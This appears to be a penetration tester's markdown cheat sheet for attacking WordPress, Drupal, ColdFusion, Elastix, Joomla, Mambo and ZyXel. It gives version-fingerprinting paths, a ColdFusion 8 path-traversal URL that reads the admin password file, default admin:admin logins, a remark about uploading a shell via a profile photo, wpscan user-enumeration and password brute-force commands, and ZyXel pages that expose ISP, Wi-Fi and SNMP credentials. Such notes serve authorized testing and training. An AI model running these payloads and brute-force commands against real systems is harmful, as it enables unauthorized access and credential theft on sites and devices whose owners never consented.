**Wordpress, Drupal, Adobe Cold Fusion, Elastix, Joomla, Mambo, ZyXel**

- Enumerate version and few other details
    - If don't found the version, download the source code and grep the version. We might found the page that contains the version then.
- Google their vulnerability
- Default password login page
- Guessing password login page?
## Adobe Cold Fusion

### Determine version

	/CFIDE/adminapi/base.cfc?wsdl

### Version 8 Vulnerability

- fckeditor
- LFI    
    `http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en`


## Drupal

### Droopescan

	droopescan scan drupal -u http://example.org/ -t 32

### Find version

	/CHANGELOG.txt

## Elastix

- Google the vulnerabitlities
- default login are `admin:admin` at `/vtigercrm/`
- able to upload shell in profile-photo
## Joomla

**Version**

	Metasploit
	/language/en-GB/en-GB.xml
	/administrator/manifests/files/joomla.xml
	/README.txt

- index.php?option=%component_name%task=%task_value%

- Admin page - `/administrator`

- Configuration files
	- configuration.php
	- diagnostics.php
	- joomla.inc.php
	- config.inc.php
## Mambo

#### Config files

	configuration.php	
	config.inc.php

## Wordpress

### Wpscan

	wpscan --url $ip/wp/
	wpscan --url $ip/wp/ -e u,vp
	wpscan --url $ip/wp/ -e u,ap

Bruteforce login page

	wpscan --url [url] --usernames [wordlist] --passwords [wordlist]

Random agent

	wpscan --url http://cybear32c.lab/ --random-agent

### Zoom.py - enumerate wordpress users

	python zoom.py -u <wordpress site>

### admin page

	/wp-admin
	/wp-login

### Configuration files

	setup-config.php
	wp-config.php

### Enumerate users

	wpscan --url $ip/wp/ -e u
	/?author=1, /?author=2,

### Bruteforce
	wpscan --url $IP --usernames $user --passwords /usr/share/wordlists/rockyou.txt
## ZyXel

	Configuration files
	
	/WAN.html (contains PPPoE ISP password)
	
	/WLAN_General.html and /WLAN.html (contains WEP key)
	
	/rpDyDNS.html (contains DDNS credentials)
	
	/Firewall_DefPolicy.html (Firewall)
	
	/CF_Keyword.html (Content Filter)
	
	/RemMagWWW.html (Remote MGMT)
	
	/rpSysAdmin.html (System)
	
	/LAN_IP.html (LAN)
	
	/NAT_General.html (NAT)
	
	/ViewLog.html (Logs)
	
	/rpFWUpload.html (Tools)
	
	/DiagGeneral.html (Diagnostic)
	
	/RemMagSNMP.html (SNMP Passwords)
	
	/LAN_ClientList.html (Current DHCP Leases)

	# Config Backups
	
	/RestoreCfg.html
	
	/BackupCfg.html